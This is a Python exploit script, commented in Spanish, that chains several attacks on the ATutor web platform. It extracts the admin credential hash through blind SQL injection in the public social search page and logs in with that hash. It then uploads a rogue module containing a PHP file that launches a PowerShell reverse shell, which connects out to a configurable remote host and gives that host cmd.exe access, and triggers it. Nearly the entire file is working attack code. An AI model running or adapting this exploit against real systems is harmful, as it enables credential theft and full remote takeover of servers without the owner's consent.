import os
import random, requests, re, hashlib
import zipfile
import subprocess


def generate_string_random(param, mayus=False):
    text = ""
    char = "abcdefghijklmnopqrstuvwxyz"
    for i in range(param):
        text += random.choice(char)
    if mayus:
        return text.upper()
    return text


class Exploit:
    rhost = ''
    rport = ''
    rtarget = ''
    payload_name = ''
    plugin_name = ''
    zip_name = ''
    powershell_name = ''
    header = ''
    remote_host = ''
    remote_port = ''

    def __init__(self, host, port, target="ATutor", remote_host="127.0.0.1", remote_port=8082):
        self.rhost = host
        self.rport = port
        self.rtarget = target
        self.payload_name = generate_string_random(4)
        self.plugin_name = generate_string_random(4)
        self.zip_name = generate_string_random(4)
        self.powershell_name = generate_string_random(3)
        self.header = generate_string_random(4, True)
        self.remote_host = remote_host
        self.remote_port = remote_port

    def exploit(self):
        credentials = self.obtain_credentials()
        if credentials is not None:
            print("Se obtuvo el hash del %s: %s" % (credentials[0], credentials[1]))
            admin_cookie = self.login(credentials[0], credentials[1])
            if self.upload_shell(admin_cookie):
                self.exec_code()

    def obtain_credentials(self):
        hash_obtained = ""
        sqli = "(select/**/length(concat(login,0x3a,password))/**/from/**/AT_admins/**/limit/**/0,1)"
        lenght = self.get_ascii_value(sqli)
        print(lenght)
        for i in range(lenght):
            sqli = "ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/AT_admins/**/limit/**/0,1)" \
                   ",%s,1))" % (i + 1)
            ascii_value = self.get_ascii_value(sqli)
            if ascii_value >= 0:
                hash_obtained += chr(ascii_value)
                print(hash_obtained)
        return hash_obtained.split(":")

    def get_ascii_value(self, sql):
        value = -1
        lower = 0
        upper = 126
        patt = re.compile(r"There are [0-9]+ entries.")
        while lower < upper:
            mid = int((lower + upper) / 2)
            sqli = "%s>%s" % (sql, mid)
            result = self.do_request(sqli)
            if patt.search(result):
                lower = mid + 1
            else:
                upper = mid
        if 0 < lower < 126:
            value = lower
        else:
            sqli = "%s=%s" % (sql, lower)
            result = self.do_request(sqli)
            if patt.search(result):
                value = lower
        return value

    def do_request(self, sql):
        search = generate_string_random(3)
        rand_key = generate_string_random(1)
        sqli = "%s'/**/or/**/%s/**/or/**/1='" % (search, sql)
        print(sqli)
        params = {'search_friends_' + rand_key: sqli,
                  'rand_key': rand_key,
                  'search': 'Search'}
        uri = self.normalize_uri("mods", "_standard", "social", "index_public.php")

        # En caso de que se quiera capturar los request en Burp (agregar el parametro proxis)
        # http_proxy = "http://127.0.0.1:8080"
        # proxyDict = {"http": http_proxy}

        r = requests.post(url=uri, data=params)
        print(r)
        return r.text

    def normalize_uri(self, *argv):
        uri = ""
        uri += "http://%s:%s/%s" % (self.rhost, self.rport, self.rtarget)
        for i in argv:
            uri += "/%s" % i
        return uri

    def login(self, username, hash_password):
        password = hashlib.sha1(hash_password.encode('utf-8')).hexdigest()
        params = {'form_password_hidden': password,
                  'form_login': username,
                  'submit': 'Login',
                  'token': ''}

        uri = self.normalize_uri("login.php")

        r = requests.post(url=uri, data=params)

        val = r.cookies._cookies[self.rhost]['/' + self.rtarget + '/']['ATutorID'].value
        cookie = {'ATutorID': val}
        print(cookie)

        red = r.url
        if "admin/index.php" in red:
            print("Login de administrador exitoso")
            return cookie
        else:
            print("Login fallido para el usuario: " + username)
            return None

    def upload_shell(self, admin_cookie):
        zip = self.create_zip(self.zip_name + ".zip")

        uri = self.normalize_uri("mods", "_core", "modules", "install_modules.php")

        files = {'modulefile': (self.zip_name + ".zip", open(self.zip_name + ".zip", 'rb'), 'application/x-zip-compressed')}

        data = {"install_upload": "Install",
                "uploading": "1"}

        r = requests.post(url=uri, data=data, files=files, cookies=admin_cookie)

        red = r.url

        if ("module_install_step_1.php" in red) or ("module_install_step_2.php" in red):
            print("Se ha instalado el plugin")
            process1 = subprocess.Popen(['python', 'bind.py'])
            return True
        else:
            print('Error en la instalacion del plugin')
        return None

    def create_zip(self, name):
        zf = zipfile.ZipFile(name, mode="w",compression=zipfile.ZIP_STORED)
        try:
            # Creo la carpeta
            os.mkdir(self.plugin_name)
            # PHP Code
            f = open(self.plugin_name+'/'+self.payload_name + ".php", "w+")
            f.write("<?php shell_exec('powershell.exe -command ./%s.ps1')?>" % self.powershell_name)
            f.close()
            # Powershell Code
            ff = open(self.plugin_name+'/'+self.powershell_name + ".ps1", "w+")
            ff.write("function cleanup {\n")
            ff.write("if ($client.Connected -eq $true) {$client.Close()}\n")
            ff.write("if ($process.ExitCode -ne $null) {$process.Close()}\n")
            ff.write("exit}\n")
            ff.write("// Setup IPADDR\n")
            ff.write("$address = '%s' \n" % self.remote_host)
            ff.write("// Setup PORT\n")
            ff.write("$port = '%s' \n" % self.remote_port)
            ff.write("$client = New-Object system.net.sockets.tcpclient\n")
            ff.write("$client.connect($address,$port)\n")
            ff.write("$stream = $client.GetStream()\n")
            ff.write("$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize\n")
            ff.write("$process = New-Object System.Diagnostics.Process\n")
            ff.write("$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'\n")
            ff.write("$process.StartInfo.RedirectStandardInput = 1\n")
            ff.write("$process.StartInfo.RedirectStandardOutput = 1\n")
            ff.write("$process.StartInfo.UseShellExecute = 0\n")
            ff.write("$process.Start()\n")
            ff.write("$inputstream = $process.StandardInput\n")
            ff.write("$outputstream = $process.StandardOutput\n")
            ff.write("Start-Sleep 1\n")
            ff.write("$encoding = new-object System.Text.AsciiEncoding\n")
            ff.write("while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}\n")
            ff.write("$stream.Write($encoding.GetBytes($out),0,$out.Length)\n")
            ff.write("$out = $null; $done = $false; $testing = 0;\n")
            ff.write("while (-not $done) {\n")
            ff.write("if ($client.Connected -ne $true) {cleanup}\n")
            ff.write("$pos = 0; $i = 1\n")
            ff.write("while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {\n")
            ff.write("$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)\n")
            ff.write("$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}\n")
            ff.write("if ($pos -gt 0) {\n")
            ff.write("$string = $encoding.GetString($networkbuffer,0,$pos)\n")
            ff.write("$inputstream.write($string)\n")
            ff.write("start-sleep 1\n")
            ff.write("if ($process.ExitCode -ne $null) {cleanup}\n")
            ff.write("else {\n")
            ff.write("$out = $encoding.GetString($outputstream.Read())\n")
            ff.write("while($outputstream.Peek() -ne -1){\n")
            ff.write("$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}\n")
            ff.write("$stream.Write($encoding.GetBytes($out),0,$out.length)\n")
            ff.write("$out = $null\n")
            ff.write("$string = $null}} else {cleanup}}\n")
            ff.close()
            zf.write(self.plugin_name)
            zf.write(self.plugin_name+'/'+self.payload_name + ".php")
            zf.write(self.plugin_name+'/'+self.powershell_name + ".ps1")
        finally:
            zf.close()
        return zf

    def exec_code(self):
        uri = self.normalize_uri("mods", self.plugin_name, self.payload_name+".php")
        r = requests.post(url=uri)
        return
